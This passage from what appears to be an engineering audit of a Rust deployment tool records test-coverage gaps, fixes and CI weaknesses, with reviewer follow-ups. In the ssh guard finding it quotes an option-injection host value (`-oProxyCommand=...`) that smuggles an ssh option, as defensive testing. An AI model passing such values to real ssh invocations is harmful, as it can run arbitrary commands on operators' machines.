errors"): every existing `rollback()` test only covered a REFUSAL path (nested
transaction, empty hosts, a mutable `:latest` snapshot, a rejected `keep_images`
override) that throws before `deploy()` is ever reached, so nothing had ever
exercised `rollback()`'s two-level indirection (the 2-arg overload calling the
3-arg body, which then calls `deploy()`) stacked on top of `deploy()`'s own already
multi-level call chain (`deploy()` -> its `transaction()` closure -> `deploy_one_host()`
-> `wait_healthy_on_host()` -> its private `ssh_http_status()` helper). That's 7
nested Rhai script-function calls before any host work even starts — comfortably
past Rhai's OWN internal function-call-nesting cap (`max_call_levels`), which this
engine's `build_engine()` (`src/engine/mod.rs`) never explicitly raised. Rhai
defaults that cap to just **8** in a debug build (64 in release —
`rhai::api::limits::default_limits::MAX_CALL_STACK_DEPTH`), and `build_engine()`
had already lifted the SEPARATE expression-nesting cap (`set_max_expr_depths(0, 0)`)
under an explicit "trusted scripts: unlimited" banner, but never touched
`max_call_levels` — so every debug build (`cargo test`/`cargo build` without
`--release`, this whole test suite included) silently ran the real orchestration
stdlib at an 8-level ceiling. The new rollback test reliably tripped Rhai's
`ErrorStackOverflow` from ordinary, non-recursive call nesting — no infinite
recursion involved — confirmed by isolating the exact call depth via targeted
debug prints and a from-scratch throwaway reproduction of the general
2-arg-delegates-to-3-arg overload pattern (which worked fine in isolation,
ruling out a generic Rhai overload-dispatch bug and pointing at the call-DEPTH
limit specifically). **Fixed** in `src/engine/mod.rs`:
`engine.set_max_call_levels(64)` — Rhai's OWN release-build default, not a
larger number. Opus's adversarial review of the first version of this fix
(which had used 256) found empirically that a genuinely infinite/runaway
script recursion hits a 64-level cap as a clean, catchable `ErrorStackOverflow`
on every thread stack size tried, but at 128+ it instead hard-**aborts** the
whole process (`SIGABRT`, bypassing `transaction()`'s unwind entirely — zero
compensations run) on a 2 MiB stack — Rust's default for spawned/test threads,
so it applies to this entire test suite. 64 still keeps 5-8x headroom over the
deepest legitimate chain in this stdlib (rollback's own indirection above, or
`standard_deploy` -> `deploy()` -> ... -> the Caddy proxy path) while staying
inside the size Rhai's own release default already treats as safe everywhere.
Mutation-verified: commenting out the `set_max_call_levels(64)` call reproduces
the exact `ErrorStackOverflow` the rollback test caught, restored afterward.

Also closed, found during R7-health's Fable final review: `deploy_behaviors.rs`'s
`wait_healthy_all_checks_each_host_via_ssh_not_a_control_machine_url` test only
asserted the ABSENCE of a control-machine URL in a dry-run plan — emptying
`wait_healthy_all`'s entire body still passed it. Added two live-mode tests in
`src/engine/eval.rs`: `wait_healthy_all_actually_probes_every_host_via_ssh`
(asserts curl actually runs over SSH against every host in the list, not just
that no control-machine URL appears) and
`wait_healthy_all_fails_fast_and_never_probes_a_later_host` (an earlier
unhealthy host throws before a later host is ever probed). Mutation-verified:
emptying `wait_healthy_all`'s body is now caught by the first new test (it was
NOT caught by the pre-existing dry-run test, reproducing Fable's finding
exactly), restored afterward.

### Real `ssh` / `docker` never exercised — High/Medium
No test spawns a real `ssh` (no sshd fixture) or `docker`. `RealRunner`'s argv
construction, exit-code mapping, and stdin piping against a live sshd are
unverified; an ssh-invocation regression breaks every remote command while the suite
stays green. Only `nrg doctor` checks toolchain presence — and `doctor` itself is
untested (below).

### CLI commands `doctor` / `init` / `tasks` / `ssh` — Medium — ✅ resolved
Zero tests. `doctor`'s `all_ok` group logic could invert and ship unnoticed; `init`'s
refuse-to-overwrite branch and `nrg ssh`'s option-injection guard are unverified.

**Resolved (2026-07-11, round 4).** This finding predated several earlier slices that had
already added substantial `doctor` coverage (unit tests for `probe_host`/`probe_hosts`/
`resolve_hosts`/`hosts_from_store` in `src/cli/doctor.rs`, plus `tests/doctor.rs` integration
tests for the hosts-section skip and corrupt-state-file cases) — so "zero tests" was stale for
`doctor` specifically by the time this slice started. What remained genuinely uncovered: the
end-to-end `all_ok` accumulation across `execute()` as a whole (every existing `doctor` test
only exercised the hosts section), and `init`/`tasks`/`ssh`'s option-injection guard, which
truly had zero tests.

Closed all of it:
- `tests/doctor.rs`: added `doctor_fails_when_the_orchestration_file_does_not_compile` and
  `doctor_succeeds_when_the_orchestration_file_compiles_and_nothing_is_deployed` — both stub
  every tool `doctor` checks for (`age`/`ssh`/`rsync`/`docker`) on a synthetic `PATH`, so the
  test is sensitive to exactly the compile-check's own `all_ok` flip rather than incidentally
  "passing" because some unrelated tool happens to be missing in whatever sandbox/CI runs the
  suite (this repo's own dev sandbox is missing real `ssh`/`rsync`/`scp`, which the first draft
  of this test didn't account for and which mutation-testing caught).
- `tests/init.rs` (new file): `init_creates_the_default_energize_rhai_file` (happy path) and
  `init_refuses_to_overwrite_an_existing_energize_rhai` — the latter asserts the pre-existing
  file's contents are byte-identical afterward, not just that an error was printed.
- `tests/ssh_option_injection.rs` (new file): proves `nrg ssh -- <option-shaped-host>` is
  refused AND that a fake `ssh` stub on `PATH` is never invoked at all — the guard exists
  specifically to stop an attacker-shaped alias from ever reaching a real `ssh` invocation, so
  "the error message is right" alone wouldn't prove the guard actually short-circuits before
  exec. (Confirmed separately, not as a test assertion, that `clap` itself already refuses an
  option-shaped positional argument without a `--`, so the guard's REAL threat model is a
  caller/wrapper that already passes `--`.)
- `tests/tasks.rs` (new file): lists functions with correct arg-count formatting, the
  no-functions-defined message, and both of `tasks`'s error paths (no orchestration file found,
  a real compile error) exit nonzero instead of crashing.

All four new/extended test files' key assertions were mutation-verified (temporarily removing
the `all_ok = false` compile-failure branch in `doctor.rs`, the refuse-to-overwrite check in
`init.rs`, and the option-shaped-host guard in `ssh.rs`, confirming each targeted test fails for
the right reason, then restoring the file byte-identical). Full `cargo build --all-targets`,
`cargo test`, `cargo clippy --all-targets -- -D warnings` gate is green.

**Follow-up (found during this fix's own Opus and Fable reviews) — no defects, one typo fixed,
two enhancements considered and declined for now.** Both reviewers independently re-verified
every load-bearing claim from source and by actually running the suite: the doctor stub list
(`age`/`ssh`/`rsync`/`docker`) covers every tool-check group `doctor.rs` actually has (the
required `age`+`ssh` pair, plus one member of each of the `rsync`/`scp` and `docker`/`podman`
OR-groups), the `nrg ssh` guard's message is distinct from the separate spawn-failure message
so the test can't pass via an unrelated exec error, and `clap` genuinely rejects an
option-shaped positional host without `--` (confirmed live: `nrg ssh -oProxyCommand=...` exits
2 from clap itself, before `execute()` ever runs). Fable additionally reproduced the mutation
test itself (same `all_ok = false` removal, same restore-and-diff). One real defect, cosmetic
only: a garbled clause in `tests/ssh_option_injection.rs`'s module doc comment ("if it "'d)
ever run") — fixed to read "if it were ever run". Two enhancements Fable suggested were
considered and declined for this slice: (1) adding a "positive control" test proving the fake
`ssh` stub mechanism itself actually works (i.e. that a NON-option-shaped host DOES reach and
invoke it) — already covered by `tests/ssh_alias_passthrough.rs`'s existing
`nrg_ssh_passes_the_alias_through_unresolved` test, which invokes the identical fake-`ssh`-on-
`PATH` pattern successfully, so adding a duplicate here would be redundant coverage rather than
a real gap; (2) extracting the `stub_bin`/`fake_ssh_bin`-style fake-executable-on-`PATH` helpers (now
duplicated across `tests/doctor.rs`, `tests/ssh_alias_passthrough.rs`,
`tests/ssh_option_injection.rs`, and `tests/caddy_patch_conflict.rs`) into a shared
`tests/common` module — a reasonable future cleanup, but out of scope for a test-coverage fix
and not something either reviewer treated as blocking.

### HTTP builtins — Medium
No test ever performs a **successful** HTTP request (no local test server) — only
unreachable-URL failures and dry-run short-circuits. The `http_status_as_error(false)`
behavior the health-check logic depends on, body extraction on 2xx/5xx, and the 30 s
timeout are untested. A `ureq` upgrade that changes any of these would silently break
health checks.

### Secrets error paths & `ENC[...]` runtime resolution — Medium
Only happy-path round-trips are tested. Wrong-key decrypt, malformed armor, and
the `.gitignore` warning logic are untested. Nothing pins what `secret()` does
with a sealed value in `.env` (see R3). (`unseal`'s overwrite behavior and the
pubkey-extraction fallback are now covered — see the resolved findings above.)

### Age tests report pass when age is absent — Medium — ✅ resolved
`tests/secrets_age.rs` returns early (reporting **pass**, not skip) when
`age`/`age-keygen` are missing. If the CI `apt-get install age` step were removed,
the credential pipeline would go untested with a green build. Use a real skip
mechanism, or assert the tests actually ran.

**Resolved (2026-07-11, round 4).** Took the finding's second suggested
approach ("assert the tests actually ran") rather than the first: stable
Rust's test harness has no way to make `#[ignore]` conditional on a runtime
check (it's compile-time only), so there's no true "skip" status available
to report from inside a test function — the only options are pass, fail, or
panic. Every OTHER test in the file keeps its existing graceful self-skip
(a contributor's local machine without `age` installed shouldn't get a wall
of spurious failures for a tool they may genuinely not have and don't need
for other work). Added one new canary test,
`age_must_be_on_path_in_ci_or_this_files_coverage_silently_vanishes`
(`tests/secrets_age.rs`), that hard-asserts `age`/`age-keygen` are on PATH
— but ONLY when the `CI` env var is set (GitHub Actions, and effectively
every other CI provider, sets this automatically; local dev shells
normally don't). This makes exactly the regression the finding describes
loud: if `.github/workflows/ci.yml`'s "Install age" step were ever removed
or broke, this ONE test now fails with a message naming the exact cause and
the exact file to fix, instead of the whole file silently going green with
zero real coverage. Verified directly (not simulated) in this dev
environment, where `age`/`age-keygen` are genuinely installed: (1) without
`CI` set, the canary self-skips gracefully like every other test in the
file; (2) with `CI=true` and `age`/`age-keygen` genuinely on PATH, the
canary passes; (3) with `CI=true` and `PATH` overridden to a directory
containing neither binary, the canary fails with the full intended
message. All three run against the real test binary (not a mocked
`age_available()`), so this is a directly-observed behavior confirmation,
not just a mutation test.

**Follow-up (found during this fix's own Opus review) — no defects, one
wording precision fix.** Opus independently confirmed `ubuntu-latest`
GitHub-hosted runners reliably set `CI=true` (the workflow's own `env:`
block only sets `CARGO_TERM_COLOR`, never overriding it), confirmed via
`dpkg -L age` that the apt package installs both `age` and `age-keygen` to
`/usr/bin` — on the default PATH for the same job's `cargo test` step, so
the canary genuinely observes the real CI PATH rather than a stale
assumption — and confirmed the test has no env-mutation/parallelism
hazard. One wording overclaim: the comment/message said the CI install
step being "removed **or broke**" was the target, but a step that
outright fails (e.g. `apt-get` erroring) already turns the whole CI run
red on its own, independent of this canary — the canary's actually unique
value is narrower: the step silently no longer running, or installing
somewhere off this job's PATH, neither of which would otherwise fail
anything. Reworded both the comment and the assert message to say this
precisely instead.

**Follow-up (found during this fix's own Fable final review) — ready to
ship, plus one new finding recorded below.** Fable independently
reproduced all three claimed CI behaviors against the real compiled test
binary (not just re-reading the prior report): the skip line, the
`CI=true`-and-present pass, and the `CI=true`-and-hidden-from-PATH failure
with the full intended message. It also searched the repo for other tests
sharing this exact "self-skip on missing external tool, silently reports
pass" shape and found one more: `proc_dir_existence_is_permission_proof_unlike_kill_0`
(`src/engine/state.rs`) — recorded as its own new finding directly below,
since the fix that applies here (a CI-gated hard assert) does not
transfer to that case for a different reason than the one it lists.

### `proc_dir_existence_is_permission_proof_unlike_kill_0` silently never runs in real CI — Medium — ✅ resolved
Found during the age-CI canary's own Fable final review (see the
follow-up paragraph above). `src/engine/state.rs`'s
`proc_dir_existence_is_permission_proof_unlike_kill_0` test self-skips
(reports pass, not skip or fail) unless `setpriv --reuid=65534
--regid=65534 --clear-groups true` succeeds, which requires `CAP_SETUID`
— in practice, requires running as root. Its own comment (line ~730)
justifies this with "root in CI/this sandbox," but that's wrong for this
repo's actual CI: `.github/workflows/ci.yml`'s `test` job runs on
`ubuntu-latest` as the default non-root `runner` user — only the
"Install age" step escalates via `sudo`, the `cargo test` step
(`.github/workflows/ci.yml:50-51`) does not. `setpriv --reuid=...` from an
unprivileged user fails outright, so this test has silently reported PASS
with zero real coverage on **every real CI run since it was added**, not
just in a hypothetical regression — worse than the age-canary case, where
CI at least satisfies the precondition today.

**Resolved (2026-07-11, round 4).** Unlike the age finding, a CI-gated
hard-assert doesn't transfer here: this repo's CI never provides root, so
copying that pattern would make this test permanently fail in CI, and
actually granting the CI job root (e.g. running the whole `cargo test`
step under `sudo`) is a much bigger, riskier change — it would silently
change every OTHER permission-sensitive test's behavior too (root bypasses
all UNIX permission checks), a shared-CI-pipeline change out of proportion
to this one test. Took the "reframe scope" remedy instead: corrected the
test's own comment (`src/engine/state.rs`, in and around what was line
730) to state plainly that this repo's actual CI runs as non-root and
never exercises the EPERM branch this test proves — the test only ever
provides real coverage when run as root, i.e. locally in a root-shell
sandbox like this one. No code/logic change; the test's assertions and
skip behavior are unchanged, only its comment no longer misdescribes what
CI actually verifies. Confirmed the test still passes as-is in this
(root) sandbox, and the full `cargo build --all-targets`, `cargo test`,
`cargo clippy --all-targets -- -D warnings` gate stays green.

**Follow-up (found during this fix's own Opus and Fable reviews) — one
docs fix applied, one narrower alternative considered and declined.**
Both reviewers independently confirmed the core CI claim by reading
`.github/workflows/ci.yml` themselves (no `container:` key, no `sudo` on
the "Test" step) and, separately, confirmed the test's real branch still
passes when actually run as root in this sandbox. Fable caught a real
inconsistency this fix had left behind: the ORIGINAL "Stale-lock
follow-up" section above (describing why this test exists at all) still
asserted the same now-corrected falsehood — "root in CI/this sandbox" —
so the doc contradicted itself when read straight through. Fixed by
updating that section to point at this one instead of re-asserting the
wrong claim. Both reviewers also raised the same narrower alternative
this write-up hadn't addressed: instead of leaving the EPERM branch
CI-uncovered, add one *isolated* extra CI step that elevates only this
single test binary invocation via `sudo` (e.g. `sudo -E cargo test
proc_dir_existence_is_permission_proof_unlike_kill_0 -- --exact`),
leaving the real `cargo test --all-targets` step untouched and non-root.
Considered and declined for now: a `sudo cargo test` invocation would
leave root-owned files under `target/` and `~/.cargo`, which the existing
`actions/cache` step (`.github/workflows/ci.yml:29-37`) would then
persist across runs — corrupting that cache for every subsequent
non-root step, including the real test run, in a way that's easy to get
wrong and hard to notice once broken. Running a pre-built binary by its
hashed filename directly under `sudo` avoids the cache issue but is
brittle (the hash changes on every dependency/toolchain bump, so the CI
step would need to rediscover it). The property this test proves is a
stable Linux kernel/VFS guarantee, not project logic, so accepting
local-sandbox-only coverage of it is a reasonable trade until a safer
CI-isolation mechanism (a separate job, or a container step, rather than
`sudo` inline in the shared job) is worth the added complexity.

### Flaky patterns — Medium
- `tests/lock_contention.rs` `concurrent_runs_serialize_on_the_state_lock` depends
  on wall-clock timing (spawn A, sleep 400 ms assuming A holds the lock, assert B
  waited ≥ 800 ms). On a loaded CI runner where A takes > 400 ms to reach the lock,
  B wins and the assertion fails. It also has no timeout on `a.wait()` — a lock
  regression hangs CI for hours instead of failing.
- Many unit tests `set_var`/`remove_var` process-global env while cargo runs test
  threads in parallel (`runner.rs` host-key test, `secret.rs`, `exec.rs`
  `NRG_SECRET_LEAK`). This races, and `set_var` concurrent with `getenv` is
  UB-adjacent on glibc. Serialize env-mutating tests or use per-process isolation.

### CI robustness — Medium/Low
- No `cargo fmt --check`.
- No `cargo audit` / `cargo deny` — a secrets-handling deploy tool has no alert for a
  known-vulnerable `ureq`/`rhai`/`fd-lock`.
- Single-OS matrix (`ubuntu-latest`) though errors recommend `brew install age`;
  macOS is never built. `src/cli/ssh.rs` unconditionally imports
  `std::os::unix::process::CommandExt`, so the crate cannot compile on Windows
  despite scattered `#[cfg(not(unix))]` fallbacks.
- No MSRV (`rust-version`) or toolchain pin; with `clippy -D warnings`, any new
  stable can break CI on unrelated PRs.
- No release/tag workflow or published binary — operators build ad-hoc from
  arbitrary commits with no reproducible artifact to roll back to.
- No per-test timeout (no `nextest`) despite blocking/spawning tests.

---

## What is already solid

Worth stating plainly, so the findings above are read in proportion:

- **Command-injection surface at the Rust boundary** is well-defended:
  option-injection rejection (`--` end-of-options + refusing `-`-prefixed hosts),
  the `Secret` type with a non-shell sentinel + `assert_no_secret_leak` at every
  effect boundary, and POSIX single-quoting via `sh_quote`.
- **Secrets don't leak through the Rust layer:** hand-written `Debug`, `to_string`
  yielding a detectable sentinel, a `+` ban, and redaction at every output sink
  (`on_print`, thrown errors, the plan log, traces).
- **State integrity:** atomic fsync'd writes with unique temp files, directory
  fsync, corrupt-state fail-loud (no silent reset), future-version refusal,
  reload-before-write merge for nested runs, and `0600` on state/key/backup.
- **Dry-run is structurally safe:** no lock, no writes (overlay store), per-builtin
  effect classification, and a sim that keeps reads consistent with stubbed writes,
  seeded from one real probe.
- **Transactions** implement correct LIFO, error-isolated, reentrancy-safe,
  deadlock-free unwind semantics (well unit-tested).
- **Strong unit coverage** of exactly these Rust-core invariants; the full suite
  passes with `--locked` and clippy-as-errors.

The gap is concentrated where the real orchestration lives — the Rhai stdlib and its
live execution path — and in operational hardening (timeouts, signals, decryption
wiring) rather than in the core safety primitives.

---

## Suggested remediation order

1. **R3** (ENC decryption wiring or loud doc) and **R1/R2** (injection) — correctness
   and security, small diffs.
2. **R4** (probe classifier) and **R5** (SSH timeouts/keep-alive) — one-line-ish fixes
   that prevent wedged deploys.
3. **R6 + R7** (rollback blackhole guard + signal handling) — the "makes an incident
   worse" class.
4. **R8** (a live-mode test seam) — unblocks testing everything else.
5. The remaining Medium stdlib items (health-check URL/timeout, concurrency).
6. CI hardening (fmt, audit, MSRV, macOS) and flaky-test cleanup.
